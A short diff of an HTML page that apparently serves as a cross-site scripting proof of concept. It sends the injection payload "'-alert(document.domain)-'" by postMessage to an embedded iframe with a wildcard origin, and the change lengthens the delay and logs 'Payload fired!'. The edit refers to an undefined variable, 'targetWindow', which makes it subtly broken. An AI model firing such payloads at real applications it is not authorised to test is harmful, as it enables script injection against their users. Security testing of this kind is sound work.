@@ -6,11 +6,10 @@
     
     <script>
         // Wait for the iframe to load, then fire the payload
-        setTimeout(function() {
-            var target = document.getElementById('targetApp').contentWindow;
-            // The '*' allows the message to be sent regardless of target origin
-            target.postMessage("'-alert(document.domain)-'", '*');
-        }, 3000);
+       setTimeout(function() {
+    targetWindow.postMessage("'-alert(document.domain)-'", "*");
+    console.log("Payload fired!");
+}, 8000); // Wait 8 seconds instead of 3
     </script>
 </body>
 </html>
